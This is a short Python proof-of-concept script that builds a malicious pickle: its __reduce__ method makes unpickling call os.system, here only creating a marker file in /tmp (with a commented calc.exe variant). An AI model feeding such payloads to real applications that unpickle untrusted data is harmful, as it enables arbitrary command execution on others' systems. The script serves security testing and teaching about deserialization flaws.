#!/usr/bin/env python
# -*- coding: utf-8 -*-

import os
import pickle


class Exp:
    def __reduce__(self):
        # windows
        # return os.system, ("calc.exe",)
        # Linux
        return os.system, ("touch /tmp/pickle_deserialization",)


poc = pickle.dumps(Exp())
print(poc)
